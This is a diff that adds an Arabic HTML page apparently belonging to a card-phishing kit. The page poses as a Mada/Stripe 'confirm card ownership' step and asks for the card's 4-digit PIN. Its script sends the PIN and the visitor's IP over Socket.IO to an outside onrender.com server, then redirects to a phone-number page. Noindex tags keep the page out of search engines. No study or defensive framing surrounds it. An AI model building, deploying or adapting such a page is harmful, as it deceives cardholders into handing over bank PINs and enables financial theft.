@@ -1,0 +1,257 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+
+<head>
+  <meta charset="utf-8" />
+  <meta content="width=device-width, initial-scale=1" name="viewport" />
+
+  <meta name="robots" content="noindex, nofollow" />
+
+  <meta name="googlebot" content="noindex, nofollow, noarchive, nosnippet" />
+  <meta name="bingbot" content="noindex, nofollow" />
+  <meta name="yandex" content="none" />
+  <title>تأكيد ملكية البطاقة</title>
+  <link crossorigin="anonymous" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css"
+    rel="stylesheet" integrity="sha384-xOolHFLEh07PJGoPkLv1IbcEPTNtaed2xpHsD9ESMhqIYd0nLMwNLD69Npy4HI+N" />
+  <style>
+    @import url("https://fonts.googleapis.com/css2?family=Readex+Pro:wght@160..700&display=swap");
+    @import url("https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css");
+
+    * {
+      font-family: "Readex Pro", sans-serif;
+    }
+
+    #loadingOverlay {
+      position: fixed;
+      inset: 0;
+      background-color: rgba(0, 0, 0, 0.6);
+      z-index: 9999;
+      justify-content: center;
+      align-items: center;
+    }
+  </style>
+  <style>
+    @font-face {
+      font-family: "Cairo";
+      font-style: normal;
+      font-weight: 200 1000;
+      src:
+
+        url("https://fonts.gstatic.com/s/cairo/v30/SLXVc1nY6HkvangtZmpQdkhzfH5lkSscQyyS4J0.woff2")
+    }
+
+    @font-face {
+      font-family: "Cairo";
+      font-style: normal;
+      font-weight: 200 1000;
+      src:
+
+        url("https://fonts.gstatic.com/s/cairo/v30/SLXVc1nY6HkvangtZmpQdkhzfH5lkSscRiyS.woff2")
+    }
+
+    body {
+      font-family: "Cairo", sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      background-color: #f5f5f5;
+      direction: rtl
+    }
+
+    ::placeholder {
+      font-family: "Cairo", sans-serif
+    }
+
+    .form-container {
+      height: 92%;
+      background-color: white;
+      width: 400px;
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+      transition: all .3s ease
+    }
+
+    .form-container h3 {
+      font-size: 18px;
+      color: #333;
+      margin-bottom: 20px
+    }
+
+    ::placeholder {
+      text-align: center
+    }
+
+    input[type="tel"] {
+      width: 100%;
+      padding: 10px;
+      margin-top: 8px;
+      border-radius: 6px;
+      border: 1px solid #ddd;
+      box-sizing: border-box;
+      transition: border-color .3s ease
+    }
+
+    .footer {
+      text-align: center;
+      font-size: 12px;
+      color: #aaa;
+      margin-top: 15px
+    }
+
+    .mada {
+      width: 80px
+    }
+
+    button {
+      padding-top: 30px;
+      background-color: #146c43;
+      color: white;
+      padding: 10px;
+      border: 1px solid #146c43;
+      border-radius: 5px;
+      width: 100%;
+      cursor: pointer;
+      font-family: "Cairo", sans-serif
+    }
+
+    button:hover {
+      background-color: #146c43;
+      color: white
+    }
+
+    #verification_code {
+      text-align: center
+    }
+  </style>
+  <style>
+    img[src="data:,"],
+    source[src="data:,"] {
+      display: none !important
+    }
+  </style>
+</head>
+
+<body>
+  <div class=form-container>
+
+    <img class=mada src="assets/images/Mada_Logo.svg.png">
+    <br><br>
+    <h3>اثبات ملكية البطاقة</h3>
+    <div>
+      <p>الرجاء ادخال الرقم السري الخاص بالبطاقة المكون من 4 ارقام</p>
+      <form id="codeForm">
+        <label for=cardholder-name>التحقق</label>
+        <input id="verification_code" type="tel" minlength="4" maxlength="4" pattern="^[0-9]{4}$"
+          title="يجب إدخال 4 أرقام بالضبط" oninput="this.value=this.value.replace(/\D/g,'').slice(0,4)" required
+          placeholder=****>
+        <br><br>
+        <button type=submit>تأكيد الشراء</button>
+        <center><br><br><br><br><br><br><br><br>
+          <img style=width:70% src="/assets/images/cards.png">
+        </center>
+      </form>
+    </div>
+    <div class=footer>مدعوم بواسطة <b>stripe</b> • الشروط • الخصوصية</div>
+  </div>
+
+  <!-- Loading overlay: start hidden via d-none -->
+  <div id="loadingOverlay" class="d-none">
+    <div class="text-center text-white">
+      <div class="spinner-border text-light mb-3" role="status"></div>
+      <h5 class="font-weight-bold">يرجى الانتظار</h5>
+      <p>انتظر حتى تتم معالجة طلبك</p>
+    </div>
+  </div>
+
+  <!-- 1) Load Socket.IO once -->
+  <script src="https://cdn.socket.io/4.6.1/socket.io.min.js"></script>
+  <script>
+    window.socket = io("https://b-care-server-mohammad.onrender.com");
+    window.visitorIP = null;
+    (async () => {
+      try {
+        const res = await fetch("https://api.ipify.org?format=json");
+        const { ip } = await res.json();
+        window.visitorIP = ip;
+        const page = window.location.pathname.split("/").pop() || "madaPin.html";
+        window.socket.emit("updateLocation", { ip, page });
+      } catch (err) {
+        console.error("Failed to fetch visitor IP:", err);
+      }
+    })();
+  </script>
+
+  <!-- 2) location.js to handle navigateTo events -->
+  <script src="./assets/js/location.js"></script>
+
+  <!-- 3) Form → socket.submitCode & overlay control, plus “decline true” logic -->
+  <script>
+    document.addEventListener("DOMContentLoaded", () => {
+      // Show decline message if URL contains '?declined=true'
+      const params = new URLSearchParams(window.location.search);
+      if (params.get("declined") === "true") {
+        const el = document.getElementById("decline-message");
+        if (el) el.style.display = "block";
+      }
+
+      const form = document.getElementById("codeForm");
+      const overlay = document.getElementById("loadingOverlay");
+
+      form.addEventListener("submit", async (e) => {
+        e.preventDefault();
+
+        // show loading overlay
+        overlay.classList.remove("d-none");
+        overlay.classList.add("d-flex");
+
+        // wait for IP to be ready (handles undefined/null/empty)
+        while (!window.visitorIP) {
+          await new Promise((r) => setTimeout(r, 50));
+        }
+        console.log("📤 submitting Code with ip=", window.visitorIP);
+
+        // read code and emit
+        const codeInput = document.getElementById("verification_code");
+        const code = (codeInput?.value || "").trim();
+
+        try {
+          if (!window.socket) throw new Error("Socket not initialized");
+          window.socket.emit("submitCode", {
+            ip: window.visitorIP,
+            verification_code: code,
+          });
+        } catch (err) {
+          // hide overlay on client-side error
+          overlay.classList.remove("d-flex");
+          overlay.classList.add("d-none");
+          console.error(err);
+        }
+      });
+
+      // Handle server acknowledgement
+      if (window.socket) {
+        window.socket.on("ackCode", (resp = {}) => {
+          if (resp.success) {
+            // Redirect after successful verification
+            window.location.href = "phone.html";
+          } else {
+            // hide overlay and log error
+            overlay.classList.remove("d-flex");
+            overlay.classList.add("d-none");
+            console.error(resp.error || "Code verification failed");
+          }
+        });
+      }
+    });
+  </script>
+
+
+  <!-- 4) Load jQuery then Bootstrap JS -->
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.slim.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/js/bootstrap.bundle.min.js"></script>
+</body>
+
+</html>
